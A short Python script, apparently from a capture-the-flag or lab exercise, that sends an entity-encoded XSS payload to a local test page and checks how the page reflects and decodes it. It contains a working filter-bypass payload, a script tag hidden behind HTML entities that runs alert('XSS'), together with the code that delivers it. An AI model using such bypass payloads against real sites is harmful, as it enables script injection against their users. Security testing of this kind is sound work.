import requests
import re
import html

target = "http://127.0.0.1:32889/page"

# Working bypass payload
payload = "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;alert('XSS')&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;"

print("Analyzing how the payload appears in the HTML response...")
print("="*80)

try:
    response = requests.get(target, params={'name': payload}, timeout=5)
    
    print(f"\nOriginal payload sent:")
    print(f"  {payload}")
    
    print(f"\nSearching for payload in response HTML...")
    
    # Look for the input field that reflects our payload
    input_match = re.search(r'(<input[^>]*>)([^<]*)', response.text, re.DOTALL)
    if input_match:
        input_tag = input_match.group(1)
        reflected_content = input_match.group(2)
        print(f"\nInput tag: {input_tag}")
        print(f"Reflected after input: {reflected_content[:200]}")
    
    # Check if payload is in the HTML
    if payload in response.text:
        print(f"\n✓ Exact payload found in response")
        
        # Find context
        idx = response.text.find(payload)
        context = response.text[max(0, idx-100):idx+len(payload)+100]
        print(f"\nContext around payload:")
        print(context)
    
    # Check different encodings
    print(f"\n--- Checking how entities are handled ---")
    
    # The browser would decode HTML entities before rendering
    # Let's see what the decoded version would look like
    decoded_once = html.unescape(payload)
    print(f"After one level of entity decoding: {decoded_once}")
    
    decoded_twice = html.unescape(decoded_once)
    print(f"After two levels of entity decoding: {decoded_twice}")
    
except Exception as e:
    print(f"ERROR: {str(e)}")

print("\n" + "="*80)

